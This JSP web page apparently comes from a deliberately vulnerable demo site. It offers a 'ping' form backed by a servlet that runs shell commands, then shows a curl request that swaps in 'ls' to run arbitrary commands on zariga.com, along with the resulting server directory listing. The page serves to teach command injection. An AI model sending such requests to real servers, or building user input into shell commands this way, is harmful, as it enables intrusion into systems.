
<!DOCTYPE html>
<html>
<head>
<title>Online Execute Commands</title>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'>
<meta name="description" content="Run all the commands online">
<meta name="keywords" content="ls,rm,netstat">
<%@ include file="include_css.jsp" %> 
<%@ include file="include_scripthighighlight.jsp"%>
<script type="text/javascript">
        $(document).ready(function() {
            $('#executeMethod').click(function (event)
            {
 			$('#form').delay(200).submit()
            });
                    
            $('#form').submit(function (event)
                    {
                    //	
                  $('#output').html('<img src="css/images/712.GIF"> loading...');
         			 event.preventDefault();
                        $.ajax({
                            type: "POST",
                            url: "CommandServlet", //this is my servlet
                
                           data: $("#form").serialize(),
                            success: function(msg){    
                            		    $('#output').empty();
                                     $('#output').append(msg);
                                     
                            }
                        }); 
                    });
        });
   
    </script>
</head>
<body>

<div id="page">
<%@ include file="include.jsp"%>
	<div id="loading" style="display: none;">
		<img src="css/images/712.GIF" alt="" />Loading!
	</div>
	

   
	<article id="contentWrapper" role="main">
	
			<section id="content">
	<form id="form" method="POST">
		<input type="hidden" name="methodName" id="methodName"
			value="EXECUTECOMMAND">
		<fieldset name="Execute Command Online">
			<legend>
				<B>Ping Statistics</B>
			</legend>
			<pre class="brush: js;">
			Without Command Execution
			</pre>
			Ping<input id="inputtext" type="text" name="text" readonly="readonly" value="ping -c4 google.com" size="50">
			<input type="button" id="executeMethod" name="executeMethod"
				value="Ping Statistics"> <br>
		</fieldset>
		<div id="output">
		
		

		
		</div>
	
	<pre class="brush: js;">
	With Command Execution 
	</pre>
	<pre class="brush: js;">
      //Command Execution change the Input Parameter to some other command for Example Execute this
      curl 'http://zariga.com/CommandServlet'  --data 'methodName=EXECUTECOMMAND&text=ls' --compressed
    </pre>
    and the Output will be something like this
    <pre class="brush: js;">
    
    <b><u>Command </b></u>= ls<br><font size="3" color="blue">COPYRIGHT<br>
LICENSE<br>
README.md<br>
bin<br>
conf<br>
env<br>
hooks<br>
lib<br>
metadata<br>
run<br>
template<br>
tmp<br>
usr<br>
webapps<br>
work<br>
</font><br>

</pre>
	
	</form>
		</section>
		</article>
		
	</div>
</body>
</html>